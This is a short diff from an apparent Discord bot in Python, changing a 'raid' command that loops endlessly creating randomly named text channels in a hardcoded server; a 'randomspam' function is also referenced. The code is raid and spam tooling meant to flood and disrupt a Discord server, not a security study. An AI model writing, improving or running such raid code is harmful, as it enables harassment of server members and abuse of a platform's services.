@@ -877,8 +877,9 @@ async def randomspam():
 
 @client.command(pass_context=True)
 async def raid(id):
+	id = 579291358666162177
 	while True:
-		await client.create_channel(579291358666162177,str(random.randint(0,1001922)),type=discord.ChannelType.text)
+		await client.create_channel(id,str(random.randint(0,1001922)),type=discord.ChannelType.text)
  
 @client.command(pass_context=True)
 async def userinfo(ctx, member: discord.Member):
